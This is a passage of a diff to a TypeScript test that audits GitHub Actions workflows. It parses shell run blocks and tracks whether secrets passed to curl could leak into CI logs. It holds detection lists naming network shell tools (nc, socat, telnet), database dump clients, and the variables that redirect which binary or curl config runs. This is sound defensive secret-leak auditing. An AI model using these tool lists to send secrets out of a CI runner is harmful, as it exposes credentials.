@@ -18,55 +18,77 @@ import { describe, expect, it } from 'vitest';
  * exit status alone, so the body is discarded and only the status printed.
  *
  * What the census reads: every workflow's and local composite action's
- * `run:` blocks, and what they run: a shell script (`bash x.sh`, `./x.sh`,
- * `source x.sh`, `bash -c '...'`, an eval or trap string, find -exec), a
- * package.json script run with pnpm, npm or yarn, and a pnpm or turbo
- * fan-out, read in every workspace package that has the script (a filter
- * only narrows that). Each is split into single commands on the shell's own
- * separators (; && || | & and new lines, outside quotes); a $(...) or
- * backquoted substitution is read as commands too, and env, sudo, timeout,
- * nice and the like (also by a path, /usr/bin/env) are read through. A
- * program run by its path (./scripts/psql, tools/wget) is the repository's
- * file whatever its name, since the shell never looks a word with a '/' up
- * on PATH: a shell script by its first line is read, any other program is
- * unresolved. A function called with a secret is read again with its
- * parameters as secrets, wherever the shell got it: from the same script, or
- * from a file that it, or a file it sourced, sourced.
+ * `run:` blocks (an action is composite by the `using:` under its `runs:`),
+ * and what they run: a shell script (`bash x.sh`, `./x.sh`, `source x.sh`,
+ * `bash -c '...'`, an eval or trap string, find -exec), a package.json
+ * script run with pnpm, npm or yarn (with the words given after its name),
+ * and a pnpm or turbo fan-out, read in every workspace package that has the
+ * script (a filter only narrows that). Each is split into single commands on
+ * the shell's own separators (; && || | & and new lines, outside quotes); a
+ * $(...) or backquoted substitution is read as commands too, and env, sudo,
+ * timeout, nice and the like (also by a path, /usr/bin/env) are read
+ * through. A program run by its path (./scripts/psql, tools/wget) is the
+ * repository's file whatever its name, since the shell never looks a word
+ * with a '/' up on PATH: a shell script by its first line is read, any other
+ * program is unresolved. One named like a program the census follows (a
+ * shell, pnpm, npm, yarn, npx, bunx, turbo, find, eval or trap, or a wrapper
+ * such as env) most likely runs that program, so what its arguments run is
+ * read by that name as well (./bin/pnpm run deploy reads the deploy script);
+ * one the repository does not hold (node_modules/.bin/turbo) is a program an
+ * earlier step made, and goes by its name. A bare name is looked
+ * up on PATH, where a repository file of that name where the step runs (or
+ * at the root) would come first were its directory on PATH, so that file is
+ * read as well. A function is read at each call, with the variables as they
+ * stand there (a global assigned from a secret after the definition is one)
+ * and its parameters from the call, wherever the shell got it: from the same
+ * script, or from a file that it, or a file it sourced, sourced. What a
+ * sourced file assigns, its caller has.
  *
  * What the census cannot read is unresolved, and the test fails until each is
  * read by hand and given a reason in READ_BY_HAND: an interpreter (node,
- * python, ...), a test runner (vitest, jest, playwright, ...), make, xargs, a
- * repository program that is not a shell script, a program named by a
- * variable, an HTTP client other than curl, a database or network client
- * (psql, redis-cli, nc, ...), an action passed a secret (in its step, or by
- * its job's or the workflow's env:) unless it is a local composite one, a run
- * block in another shell, an npm or yarn workspace fan-out, anything past the
- * depth limit, and a program that has a curl command among its arguments (a
- * wrapper WRAPPERS does not list). A client's name is looked up on PATH, so
- * a repository file of that name where the step runs is read as well. Any
- * other program (jq, tar, next build, a CLI that pnpm dlx fetches) is taken
- * for what it is: the census does not read it.
+ * python, ...), a test runner (vitest, jest, playwright, rspec, go test,
+ * xcodebuild test, ...), a load-test runner (k6, artillery, locust, hurl),
+ * make and the other task runners, xargs, a repository program that is not a
+ * shell script, a program, script, task or package named by a variable
+ * (npm run "$X", turbo "$@", npx "$TOOL", find "$@"), an HTTP client other
+ * than curl, a database or network client (psql, pg_dump, redis-cli, nc,
+ * ...), an action passed a secret (in its step, by its job's or the
+ * workflow's env:, or by its own input's default) unless it is a local
+ * composite one, a run block in another shell, an npm or yarn workspace
+ * fan-out, anything past the depth limit, and a program that has a curl
+ * command among its arguments (a wrapper WRAPPERS does not list). So is what
+ * changes the file a bare name runs, or the config file curl reads by
+ * itself: a directory added to $GITHUB_PATH; PATH, HOME, CURL_HOME or
+ * XDG_CONFIG_HOME set, in a script, through $GITHUB_ENV or in an env:; a
+ * curlrc named; and a repository file put into a bin directory. Any other
+ * program (jq, tar, next build, a CLI that pnpm dlx fetches) is taken for
+ * what it is: the census does not read it.
  *
  * A reason read by hand holds only while what it relies on holds. So each
  * READ_BY_HAND entry also records the secrets in the call's environment (what
- * the env: of its step, job or workflow maps from a secret, and any name a
- * step writes to $GITHUB_ENV or $GITHUB_OUTPUT from one), every secret its
- * job uses in any step (the steps share a runner, so one can leave a secret
- * in a file for another), and a hash of each repository file the call runs
- * (a repository program run by its path, the files named on its command line
- * or what `node --test` finds, and what they import from the repository).
- * When any of these changes, the call is unresolved again until someone
- * reads it again. A call whose files the census cannot list (a whole test
- * suite) records none, so its reason can rest only on its environment and
- * its job.
+ * the env: of its step, job or workflow maps from a secret, any name a step
+ * writes to $GITHUB_ENV or $GITHUB_OUTPUT from one, any name the shell
+ * assigns or exports from one, and every secret its own run block pastes
+ * in), every secret its job uses in any step (the steps share a runner, so
+ * one can leave a secret in a file for another), a hash of each repository
+ * file the call runs (a repository program, the files named on its command
+ * line, inline ones too (--file=x), the module python -m runs, the files a
+ * runner reads by itself (a Makefile, the package.json run-s reads), what
+ * `node --test` finds, a local action's whole directory, and what they import
+ * from the repository), and, for a call inside a script or function called
+ * with arguments, each such call and the files its arguments name ("$@" runs
+ * what the caller passes). When any of these changes, the call is unresolved
+ * again until someone reads it again. A call whose files the census cannot
+ * list (a whole test suite) records none, so its reason can rest only on its
+ * environment, its job and its calls.
  *
  * A secret is ${{ secrets }} in any form or github.token; an env., inputs.,
  * vars., steps.<id>.outputs. or needs.<job>.outputs. name that a workflow maps
  * from one (env:, with:, outputs:, an input's default, a line written to
  * $GITHUB_ENV or $GITHUB_OUTPUT) or that is named like SECRET, TOKEN, KEY or
- * PASSWORD; a shell variable mapped, assigned or named that way; a curl
- * variable imported from one; and the arguments of a script or function
- * called with one.
+ * PASSWORD; a shell variable mapped, assigned (also by for, printf -v or
+ * set --) or named that way; a curl variable imported from one; and the
+ * arguments of a script or function called with one.
  *
  * A curl sends a secret when one of its words uses a secret, or it has an
  * Authorization, Proxy-Authorization or Cookie header, headers read from a
@@ -78,7 +100,9 @@ import { describe, expect, it } from 'vitest';
  * that it holds no secret; nor can it tell for a value that opens with an
  * expansion ("$BODY" may hold @file), an option curl's manual does not list,
  * or a list of words ("${OPTS[@]}"), so these count as sending one too.
- * Such a curl must:
+ * Nor can it see what a command printed or a file held ($(cat token.txt), a
+ * variable assigned from one or read with read): a curl that sends such a
+ * value and keeps its answer is unresolved. A curl that sends a secret must:
  * - write every answer to exactly /dev/null: one -o /dev/null per URL, after
  *   each --next too. A URL that may expand to several transfers (a {..} or
  *   [..] glob, or an expansion whose text the census cannot see) needs
@@ -165,7 +189,12 @@ interface Command {
   nested: Array<{ script: string; line: number }>;
   /** Here-document bodies fed to it. */
   heredocs: string[];
+  /** The functions whose bodies it is in, outermost first. */
+  fn: string[];
 }
+
+/** A function's name, as a definition gives it: NAME() or function NAME. */
+const FUNCTION_NAME = /^[A-Za-z_][\w-]*$/;
 
 function count(text: string, ch: string): number {
   return text.split(ch).length - 1;
@@ -259,7 +288,14 @@ function patternEnd(s: string, open: number): number {
 function parseShell(s: string): Command[] {
   const commands: Command[] = [];
   let line = 1;
-  const blank = (): Command => ({ words: [], line, piped: false, nested: [], heredocs: [] });
+  const blank = (): Command => ({
+    words: [],
+    line,
+    piped: false,
+    nested: [],
+    heredocs: [],
+    fn: [],
+  });
   let cur = blank();
   // In an object, so what the helpers below assign is not narrowed away.
   const state: {
@@ -274,6 +310,10 @@ function parseShell(s: string): Command[] {
     /** A case pattern (a|b) or esac comes next. */
     pattern: boolean;
     caseDepth: number;
+    /** NAME() or function NAME read: its body comes next. */
+    fnHeader: string | null;
+    /** The function bodies open here, innermost last: { ... } or ( ... ), and how deep. */
+    frames: Array<{ name: string; depth: number; paren: boolean }>;
   } = {
     word: null,
     heredocNext: null,
@@ -282,6 +322,8 @@ function parseShell(s: string): Command[] {
     afterIn: false,
     pattern: false,
     caseDepth: 0,
+    fnHeader: null,
+    frames: [],
   };
   let pendingHeredocs: Array<{ delimiter: string; strip: boolean; into: string[] }> = [];
 
@@ -305,14 +347,41 @@ function parseShell(s: string): Command[] {
         state.casePending = false;
         state.afterIn = true;
       } else if (first && word.raw === 'esac' && state.caseDepth > 0) state.caseDepth--;
+      // A function's body: NAME() { ... }, function NAME { ... }, and the
+      // { ... } groups inside it, so a call can read the body alone.
+      const top = state.frames.at(-1);
+      const header = cur.words.length === 2 && cur.words[0]?.value === 'function';
+      if (word.raw === '{' && first && state.fnHeader !== null) {
+        state.frames.push({ name: state.fnHeader, depth: 1, paren: false });
+        state.fnHeader = null;
+      } else if (word.raw === '{' && header && FUNCTION_NAME.test(cur.words[1]?.value ?? '')) {
+        state.frames.push({ name: cur.words[1]?.value ?? '', depth: 1, paren: false });
+      } else if (word.raw === '{' && first && top && !top.paren) {
+        top.depth++;
+      } else if (word.raw === '}' && first && top && !top.paren) {
+        if (--top.depth === 0) state.frames.pop();
+      } else if (first) {
+        // NAME() and then anything but a body the census tracks.
+        state.fnHeader = null;
+      }
       cur.words.push(word);
     }
     state.word = null;
   };
   const endCommand = (piped = false) => {
     endWord();
-    if (cur.words.length > 0 || cur.nested.length > 0) {
+    const [keyword, name] = cur.words;
+    if (
+      cur.words.length === 2 &&
+      keyword?.value === 'function' &&
+      FUNCTION_NAME.test(name?.value ?? '') &&
+      cur.nested.length === 0
+    ) {
+      // function NAME, its body on the next line: a definition, not a command.
+      state.fnHeader = name?.value ?? null;
+    } else if (cur.words.length > 0 || cur.nested.length > 0) {
       cur.piped = piped;
+      cur.fn = state.frames.map((frame) => frame.name);
       commands.push(cur);
     }
     cur = blank();
@@ -483,8 +552,38 @@ function parseShell(s: string): Command[] {
       add(raw);
       line += count(raw, '\n');
       i = close + 1;
-    } else if (c === '(' || c === ')') {
+    } else if (c === '(') {
+      endWord();
+      const header = /^\(\s*\)/.exec(s.slice(i))?.[0];
+      const names = cur.words.map((word) => word.value);
+      const name = names.length === 2 && names[0] === 'function' ? names[1] : names[0];
+      if (
+        header &&
+        cur.nested.length === 0 &&
+        (names.length === 1 || (names.length === 2 && names[0] === 'function')) &&
+        FUNCTION_NAME.test(name ?? '')
+      ) {
+        // NAME() or function NAME(): a definition, not a command.
+        state.fnHeader = name ?? null;
+        cur = blank();
+        line += count(header, '\n');
+        i += header.length;
+        cur.line = line;
+        continue;
+      }
+      if (state.fnHeader !== null && cur.words.length === 0) {
+        // NAME() ( ... ): the body runs in a subshell.
+        state.frames.push({ name: state.fnHeader, depth: 0, paren: true });
+        state.fnHeader = null;
+      }
       endCommand();
+      const top = state.frames.at(-1);
+      if (top?.paren) top.depth++;
+      i++;
+    } else if (c === ')') {
+      endCommand();
+      const top = state.frames.at(-1);
+      if (top?.paren && --top.depth === 0) state.frames.pop();
       i++;
     } else if (c === '<' && d === '<') {
       endWord();
@@ -544,20 +643,108 @@ function expansion(raw: string): { expands: boolean; splits: boolean } {
   return { expands, splits };
 }
 
-/** A variable assigned from a secret is one too; so are $1 and on after set -- with one. */
-function taint(words: Word[], secretVars: Set<string>): void {
-  if (
-    words[0]?.value === 'set' &&
-    words.slice(1).some((word) => usesSecret(word.raw, secretVars))
-  ) {
-    for (const name of POSITIONAL) secretVars.add(name);
+/** Whether a word holds a command's output: $(...), $(<file) or `...`, not $((...)). */
+function hasSubstitution(raw: string): boolean {
+  let quoted = false;
+  for (let j = 0; j < raw.length; j++) {
+    const ch = raw.charAt(j);
+    if (ch === '\\') j++;
+    else if (ch === "'" && !quoted) j = singleQuoteEnd(raw, j);
+    else if (ch === '$' && raw.charAt(j + 1) === "'" && !quoted) j = ansiQuoteEnd(raw, j + 1);
+    else if (ch === '"') quoted = !quoted;
+    else if (ch === '`') return true;
+    else if (ch === '$' && raw.charAt(j + 1) === '(') {
+      if (raw.charAt(j + 2) !== '(') return true;
+      j = closeOf(raw, j + 1, '(', ')');
+    }
   }
-  const declares = ['export', 'local', 'declare', 'readonly', 'typeset'];
-  const list = declares.includes(words[0]?.value ?? '') ? words.slice(1) : words;
-  for (const word of list) {
+  return false;
+}
+
+/**
+ * Whether a word holds what the census cannot see: a command's output, or a
+ * variable assigned from one or read from a file or standard input.
+ */
+function readsUnseen(raw: string, unseen: ReadonlySet<string>): boolean {
+  if (hasSubstitution(raw.replace(EXPRESSION, ''))) return true;
+  for (const m of raw.replace(EXPRESSION, '').matchAll(SHELL_VARIABLE)) {
+    if (unseen.has(m[1] ?? '')) return true;
+  }
+  return false;
+}
+
+/** Options of read and mapfile that take a value, and the one that names the array. */
+const READ_VALUES: Record<string, string[]> = {
+  read: ['-a', '-d', '-i', '-n', '-N', '-p', '-t', '-u'],
+  mapfile: ['-d', '-n', '-O', '-s', '-u', '-C', '-c'],
+  readarray: ['-d', '-n', '-O', '-s', '-u', '-C', '-c'],
+};
+
+/**
+ * What a command assigns. A variable assigned from a secret is one too, and
+ * so are $1 and on after set -- with one, and a for loop's variable over
+ * one. A variable assigned from what the census cannot see (a command's
+ * output, a line read from a file or standard input) is `unseen`. Returns
+ * the names it assigned from a secret.
+ */
+function taint(words: Word[], secretVars: Set<string>, unseen: Set<string>): string[] {
+  const assigned: string[] = [];
+  const mark = (name: string, values: Word[], read = false) => {
+    if (values.some((word) => usesSecret(word.raw, secretVars))) {
+      secretVars.add(name);
+      assigned.push(name);
+    }
+    if (read || values.some((word) => readsUnseen(word.raw, unseen))) unseen.add(name);
+  };
+  const at = words.findIndex((word) => !RESERVED.has(word.value));
+  const head = at === -1 ? '' : (words[at]?.value ?? '');
+  const rest = at === -1 ? [] : words.slice(at + 1);
+  if (head === 'set') {
+    // set -- a b: the parameters, which are not in the environment.
+    const secret = rest.some((word) => usesSecret(word.raw, secretVars));
+    const hidden = rest.some((word) => readsUnseen(word.raw, unseen));
+    for (const name of POSITIONAL) {
+      if (secret) secretVars.add(name);
+      if (hidden) unseen.add(name);
+    }
+  }
+  if (head === 'for' || head === 'select') {
+    // for NAME in WORDS; or for NAME, which walks "$@".
+    const name = rest[0]?.value ?? '';
+    const list = rest[1]?.value === 'in' ? rest.slice(2) : [{ raw: '"$@"', value: '$@' }];
+    if (ASSIGNMENT.test(`${name}=`)) mark(name, list);
+  }
+  const values = READ_VALUES[head];
+  if (values) {
+    // read NAME..., read -a NAME, mapfile NAME: what they read, the census cannot see.
+    const names: string[] = [];
+    for (let k = 0; k < rest.length; k++) {
+      const arg = rest[k]?.value ?? '';
+      if (REDIRECTION.test(arg)) {
+        if (REDIRECTION_ALONE.test(arg)) k++;
+      } else if (arg.startsWith('-') && arg.length > 1) {
+        const option = arg.slice(0, 2);
+        if (values.includes(option) && arg.length === 2) {
+          k++;
+          if (option === '-a') names.push(rest[k]?.value ?? '');
+        } else if (option === '-a') names.push(arg.slice(2));
+      } else {
+        names.push(arg);
+      }
+    }
+    if (names.length === 0) names.push(head === 'read' ? 'REPLY' : 'MAPFILE');
+    for (const name of names) if (ASSIGNMENT.test(`${name}=`)) mark(name, rest, true);
+  }
+  if (head === 'printf' && rest[0]?.value === '-v') {
+    // printf -v NAME FORMAT ARGS: NAME holds what it formats.
+    mark(rest[1]?.value ?? '', rest.slice(2));
+  }
+  // NAME=value anywhere: before the command, after export, local or declare, or env's.
+  for (const word of words) {
     const m = ASSIGNMENT.exec(word.raw);
-    if (m?.[1] && usesSecret(m[2] ?? '', secretVars)) secretVars.add(m[1]);
+    if (m?.[1]) mark(m[1], [{ raw: m[2] ?? '', value: m[2] ?? '' }]);
   }
+  return assigned;
 }
 
 // ─── curl ──────────────────────────────────────────────────────────────────
@@ -729,7 +916,15 @@ interface Curl {
   unknown: string[];
   /** "$@", "${ARGS[@]}" and the like: words the census cannot see. */
   lists: string[];
+  /** The words that name where it writes (-o, -D, --trace, -w ...): nothing it sends. */
+  targets: Word[];
 }
+
+/** Options whose value is where curl writes, or what it prints: no part of the request. */
+const CURL_TARGETS = new Set([
+  ...['output', 'output-dir', 'write-out', 'stderr', 'create-file-mode'],
+  ...SIDE_OUTPUTS,
+]);
 
 /** An expansion into a list of words: $@, $*, ${NAME[@]}, ${NAME[*]}. */
 const LIST_EXPANSION = /\$(?:[@*]|\{(?:[@*]|[!#]?[A-Za-z_][A-Za-z0-9_]*\[[@*]\][^}]*)\})/;
@@ -778,10 +973,12 @@ function readCurl(args: Word[]): Curl {
     options: new Set(),
     unknown: [],
     lists: [],
+    targets: [],
   };
   let segment: Transfers = { outputs: [], urls: [], globoff: false };
   curl.segments.push(segment);
   const option = (name: string, value: string, word: Word) => {
+    if (CURL_TARGETS.has(name)) curl.targets.push(word);
     if (name === 'output') segment.outputs.push(value);
     else if (name === 'url') segment.urls.push({ raw: word.raw, value });
     else if (name === 'write-out') curl.writeOuts.push(value);
@@ -965,12 +1162,18 @@ interface Unresolved {
   file: string;
   command: string;
   why: string;
-  /** The secrets in its environment, by name: what env: maps or a step writes from one. */
+  /**
+   * The secrets in its environment: the names env: maps or a step writes
+   * from one, the names its shell assigns or exports from one, and the
+   * secret expressions in its own step's script.
+   */
   secrets: string[];
   /** Every secret its job uses, in any step: one step can leave a secret on disk for another. */
   jobSecrets: string[];
   /** The repository files it runs, each with a hash of its text. */
   runs: Record<string, string>;
+  /** The calls that passed it arguments: of the script or function it is in, and theirs. */
+  calls: string[];
 }
 
 interface Census {
@@ -985,7 +1188,7 @@ interface Ctx {
   io: Io;
   /** Names that hold a secret anywhere: what the workflows map or write from one. */
   names: Set<string>;
-  /** The secrets in the environment of the run block being read. */
+  /** The secrets in the environment of the run block being read, and those in its script. */
   env: string[];
   /** The secrets its job uses anywhere. */
   jobSecrets: string[];
@@ -1003,16 +1206,38 @@ interface FunctionHome {
 interface Shell {
   /** Its functions: its own scripts', and those of the files they sourced. */
   functions: Map<string, FunctionHome>;
-  /** The scripts already read again with their parameters as secrets. */
+  /** The function bodies already read for a call, by what the call gave them. */
   reread: Set<string>;
 }
 
 interface Scope {
   /** The names above, plus what this script assigned from one. */
   secretVars: Set<string>;
+  /** Variables that hold what the census cannot see: a command's output, a file's line. */
+  unseen: Set<string>;
+  /** The names this shell, or one that started it, assigned or exported from a secret. */
+  envSecrets: Set<string>;
+  /** The calls that passed this script or function arguments, outermost first. */
+  calls: string[];
+  /** The repository files those calls name, each with a hash of its text. */
+  callRuns: Record<string, string>;
   cwd: string;
   depth: number;
   shell: Shell;
+}
+
+/** A run block's scope: the names that hold a secret anywhere, and nothing else yet. */
+function blockScope(names: ReadonlySet<string>, cwd: string): Scope {
+  return {
+    secretVars: new Set(names),
+    unseen: new Set(),
+    envSecrets: new Set(),
+    calls: [],
+    callRuns: {},
+    cwd,
+    depth: 0,
+    shell: { functions: new Map(), reread: new Set() },
+  };
 }
 
 /**
@@ -1053,7 +1278,9 @@ const RUNNER = new RegExp(
     'perl[\\d.]*|php[\\d.]*|lua[\\d.]*|Rscript|pwsh|powershell|osascript|expect|tclsh',
     // Test runners: a test can call a server, and a failed assertion prints what came back.
     'vitest|jest|playwright|mocha|cypress|ava|jasmine|karma|tap|uvu|pytest|nyc|c8|bats',
-    'wdio|testcafe|codeceptjs|cucumber-js|newman|detox|maestro',
+    'wdio|testcafe|codeceptjs|cucumber-js|newman|detox|maestro|rspec|phpunit|tox|nox',
+    // Load-test runners: each sends the requests its script describes and prints a summary.
+    'k6|artillery|locust|hurl',
     // Task runners and fan-outs.
     'g?make|just|task|mage|rake|gradlew?|mvn|ant|bazel|nx|lerna|rush|npm-run-all|run-[sp]',
     'concurrently',
@@ -1062,11 +1289,114 @@ const RUNNER = new RegExp(
     'unshare|systemd-run|firejail|caffeinate|strace|ltrace|valgrind|gdb',
   ].join('|')})$`,
 );
+/** Toolchains whose subcommand runs a program or its tests: go test, cargo run, xcodebuild test. */
+const RUNNER_SUBCOMMANDS: Record<string, string[]> = {
+  go: ['test', 'run', 'generate'],
+  cargo: ['test', 'run', 'bench', 'nextest'],
+  dotnet: ['test', 'run'],
+  swift: ['test', 'run'],
+  // An action, wherever it stands among the options.
+  xcodebuild: ['test', 'test-without-building'],
+};
+
+/** Whether a program runs code the census cannot read (RUNNER, or a runner subcommand). */
+function isRunner(name: string, args: Word[]): boolean {
+  if (RUNNER.test(name)) return true;
+  const subcommands = RUNNER_SUBCOMMANDS[name];
+  if (!subcommands) return false;
+  if (name === 'xcodebuild') return args.some((word) => subcommands.includes(word.value));
+  // The first word that is not an option (go -C dir test: -C takes the next word).
+  for (let k = 0; k < args.length; k++) {
+    const arg = args[k]?.value ?? '';
+    if (arg === '-C') k++;
+    else if (!arg.startsWith('-')) return subcommands.includes(arg);
+  }
+  return false;
+}
+
+/**
+ * The files a runner reads by itself, where it runs (`-f` and the like name
+ * another): a Makefile's recipes, the package.json scripts run-s runs.
+ */
+const RUNNER_INPUTS: Record<string, { files: string[]; options: string[]; up?: boolean }> = {
+  make: {
+    files: ['GNUmakefile', 'makefile', 'Makefile'],
+    options: ['-f', '--file', '--makefile'],
+  },
+  just: { files: ['justfile', 'Justfile', '.justfile'], options: ['-f', '--justfile'], up: true },
+  task: {
+    files: ['Taskfile.yml', 'taskfile.yml', 'Taskfile.yaml', 'taskfile.yaml'].flatMap((file) => [
+      file,
+      file.replace('.y', '.dist.y'),
+    ]),
+    options: ['-t', '--taskfile'],
+    up: true,
+  },
+  rake: {
+    files: ['Rakefile', 'rakefile', 'Rakefile.rb', 'rakefile.rb'],
+    options: ['-f'],
+    up: true,
+  },
+  gradle: {
+    files: ['build.gradle', 'build.gradle.kts', 'settings.gradle', 'settings.gradle.kts'],
+    options: ['-b', '--build-file'],
+  },
+  mvn: { files: ['pom.xml'], options: ['-f', '--file'] },
+  ant: { files: ['build.xml'], options: ['-f', '-file', '-buildfile'] },
+  mage: { files: ['magefile.go'], options: [] },
+  nx: { files: ['nx.json', 'project.json', 'package.json'], options: [] },
+  lerna: { files: ['lerna.json', 'package.json'], options: [] },
+  rush: { files: ['rush.json'], options: [] },
+  'npm-run-all': { files: ['package.json'], options: [] },
+  concurrently: { files: ['package.json'], options: [] },
+  tox: { files: ['tox.ini', 'pyproject.toml', 'setup.cfg'], options: ['-c'] },
+  nox: { files: ['noxfile.py'], options: ['-f', '--noxfile'] },
+  locust: { files: ['locustfile.py'], options: ['-f', '--locustfile'] },
+};
+for (const [alias, name] of [
+  ['gmake', 'make'],
+  ['gradlew', 'gradle'],
+  ['run-s', 'npm-run-all'],
+  ['run-p', 'npm-run-all'],
+] as const) {
+  const inputs = RUNNER_INPUTS[name];
+  if (inputs) RUNNER_INPUTS[alias] = inputs;
+}
+
 const HTTP_CLIENTS = new Set(['wget', 'http', 'https', 'httpie', 'xh', 'xhs', 'aria2c', 'curlie']);
 /** Database and raw network clients: each prints what the server answers, by design. */
 const SERVER_CLIENTS = new Set([
   ...['psql', 'mysql', 'mariadb', 'mongosh', 'mongo', 'redis-cli', 'sqlcmd', 'cqlsh'],
+  // Dump, export and test clients print what the server holds too (pg_dump with no -f).
+  ...['pg_dump', 'pg_dumpall', 'pg_prove', 'pgcli', 'mycli', 'mysqldump', 'mongodump'],
+  'mongoexport',
   ...['nc', 'ncat', 'netcat', 'socat', 'telnet', 'websocat', 'grpcurl'],
+]);
+/**
+ * Shell builtins and keywords: the shell runs its own, never a file PATH
+ * finds, so no repository file of the name can stand in for one.
+ */
+const BUILTINS = new Set([
+  ...[':', '.', '[', '[[', 'alias', 'bg', 'bind', 'break', 'builtin', 'caller', 'cd'],
+  ...['command', 'compgen', 'complete', 'compopt', 'continue', 'declare', 'dirs', 'disown'],
+  ...['echo', 'enable', 'eval', 'exec', 'exit', 'export', 'false', 'fc', 'fg', 'getopts'],
+  ...['hash', 'help', 'history', 'jobs', 'kill', 'let', 'local', 'logout', 'mapfile', 'popd'],
+  ...['printf', 'pushd', 'pwd', 'read', 'readarray', 'readonly', 'return', 'set', 'shift'],
+  ...['shopt', 'source', 'suspend', 'test', 'times', 'trap', 'true', 'type', 'typeset'],
+  ...['ulimit', 'umask', 'unalias', 'unset', 'wait'],
+  ...['if', 'then', 'else', 'elif', 'fi', 'case', 'esac', 'for', 'select', 'while', 'until'],
+  ...['do', 'done', 'in', 'function', 'time', '{', '}', '!', ']]', 'coproc'],
+]);
+/**
+ * Variables that decide what a bare name runs (PATH), or which config file
+ * curl reads by itself ($CURL_HOME/.curlrc, $XDG_CONFIG_HOME/curlrc,
+ * ~/.curlrc): a change to one is unresolved, for this reason.
+ */
+const LOOKUP_VARIABLES = new Map([
+  ['PATH', 'which decides the file a bare name runs'],
+  ['HOME', 'where curl finds the .curlrc it reads by itself'],
+  ['CURL_HOME', 'where curl finds the .curlrc it reads by itself'],
+  ['XDG_CONFIG_HOME', 'where curl finds the curlrc it reads by itself'],
 ]);
 /** Words before the command itself that take no option. */
 const KEYWORDS = new Set([
@@ -1141,8 +1471,15 @@ function text(words: Word[]): string {
   return words.map((word) => word.raw).join(' ');
 }
 
+/**
+ * Something the census cannot read, with what a reading by hand relies on:
+ * the secrets in its environment (its step's, and what its shell assigned
+ * or exported from one), its job's, the files it runs, and the calls that
+ * passed it arguments and the files they name.
+ */
 function cannotRead(
   ctx: Ctx,
+  scope: Scope | undefined,
   src: Source,
   where: string,
   command: string,
@@ -1154,9 +1491,10 @@ function cannotRead(
     file: src.file,
     command,
     why,
-    secrets: [...ctx.env],
+    secrets: [...new Set([...ctx.env, ...(scope?.envSecrets ?? [])])].sort(),
     jobSecrets: [...ctx.jobSecrets],
-    runs,
+    runs: { ...scope?.callRuns, ...runs },
+    calls: [...(scope?.calls ?? [])],
   });
 }
 
@@ -1233,20 +1571,8 @@ function localImports(path: string, text: string, io: Io): string[] {
   return found.filter((file): file is string => file !== undefined && file !== path);
 }
 
-/**
- * The repository files an interpreter or a test runner runs, each with a
- * hash of its text: the files it is given (any word that names one), or that
- * `node --test` finds when it is given none, and what they import from the
- * repository, to the depth limit.
- */
-function filesRun(name: string, args: Word[], scope: Scope, io: Io): Record<string, string> {
-  const paths = args
-    .filter((word) => !word.value.startsWith('-'))
-    .map((word) => findFile(word.value, scope, io))
-    .filter((path): path is string => path !== undefined);
-  if (/^node(?:js)?$/.test(name) && paths.length === 0 && args.some((w) => w.value === '--test')) {
-    paths.push(...nodeTestFiles(scope.cwd, io));
-  }
+/** Each file with a hash of its text, and what it imports from the repository, to the depth limit. */
+function hashed(paths: string[], io: Io): Record<string, string> {
   const runs = new Map<string, string>();
   for (let level = 0, next = paths; level <= MAX_DEPTH && next.length > 0; level++) {
     const imported: string[] = [];
@@ -1261,17 +1587,140 @@ function filesRun(name: string, args: Word[], scope: Scope, io: Io): Record<stri
   return Object.fromEntries([...runs].sort(([a], [b]) => (a < b ? -1 : a > b ? 1 : 0)));
 }
 
+/** node options whose value is the next word: a file it loads, or no file at all. */
+const NODE_VALUES = new Set([
+  ...['--import', '-r', '--require', '--loader', '--experimental-loader', '--env-file'],
+  ...['--env-file-if-exists', '-e', '--eval', '-p', '--print', '--input-type', '-C'],
+  ...['--conditions', '--test-reporter', '--test-reporter-destination', '--test-name-pattern'],
+  ...['--test-skip-pattern', '--test-concurrency', '--test-shard', '--test-timeout'],
+  ...['--test-global-setup', '--watch-path', '--experimental-config-file', '--title'],
+]);
+/** python options whose value is the next word: -m names a module, -c is code. */
+const PYTHON_VALUES = new Set(['-m', '-c', '-W', '-X', '--check-hash-based-pycs']);
+
+/** The module `python -m a.b` runs: a/b.py, or the package's __main__.py, from where it runs. */
+function pythonModule(module: string, scope: Scope, io: Io): string[] {
+  const path = module.split('.').join('/');
+  const found = [`${path}.py`, `${path}/__main__.py`, `${path}/__init__.py`]
+    .map((file) => findFile(file, scope, io))
+    .filter((file): file is string => file !== undefined);
+  return found;
+}
+
+/** The files a runner reads by itself (RUNNER_INPUTS), where it runs or the option names. */
+function runnerInputs(name: string, args: Word[], scope: Scope, io: Io): string[] {
+  const inputs = RUNNER_INPUTS[name];
+  if (!inputs) return [];
+  let dir = scope.cwd;
+  const named: string[] = [];
+  for (let k = 0; k < args.length; k++) {
+    const [option, inline] = splitOption(args[k]?.value ?? '');
+    // make -C dir: the directory it runs in.
+    if ((option === '-C' || option === '--directory') && name.endsWith('make')) {
+      dir = posix.join(dir, inline ?? args[++k]?.value ?? '');
+    } else if (inputs.options.includes(option)) {
+      named.push(inline ?? args[++k]?.value ?? '');
+    } else {
+      const attached = inputs.options.find((o) => /^-\w$/.test(o) && option.startsWith(o));
+      if (attached && option.length > 2) named.push(option.slice(2));
+    }
+  }
+  const found: string[] = [];
+  const at = { ...scope, cwd: dir };
+  for (const file of named) {
+    const path = findFile(file, at, io);
+    if (path !== undefined) found.push(path);
+  }
+  // Its own file, here, or (just, task and rake) in a directory above.
+  for (let up = dir; named.length === 0; up = posix.dirname(up)) {
+    for (const file of inputs.files) {
+      const path = posix.join(up, file);
+      if (io.read(path) !== null) found.push(path);
+    }
+    if (!inputs.up || up === '.' || up === '/' || up === '') break;
+  }
+  // A Makefile's include lines, as written.
+  for (const path of [...found]) {
+    if (!name.endsWith('make')) break;
+    for (const m of (io.read(path) ?? '').matchAll(/^[ \t]*-?s?include[ \t]+(.+)$/gm)) {
+      for (const file of (m[1] ?? '').trim().split(/\s+/)) {
+        const included = findFile(file, at, io);
+        if (included !== undefined) found.push(included);
+      }
+    }
+  }
+  return found;
+}
+
+/**
+ * The repository files an interpreter, a runner or a client runs or reads,
+ * each with a hash of its text: the files its words name (an option's own
+ * value too: --file=x, -fx), the module python -m runs, the test files
+ * `node --test` finds when it is given none (the value of --import or the
+ * like is not one), the files a runner reads by itself (a Makefile, the
+ * package.json run-s reads), and what they import from the repository.
+ */
+function filesRun(name: string, args: Word[], scope: Scope, io: Io): Record<string, string> {
+  const node = /^node(?:js)?$/.test(name);
+  const python = /^(?:python|pypy)[\d.]*$/.test(name);
+  const paths: string[] = [];
+  /** Files named as operands, not as an option's value: what node --test is given. */
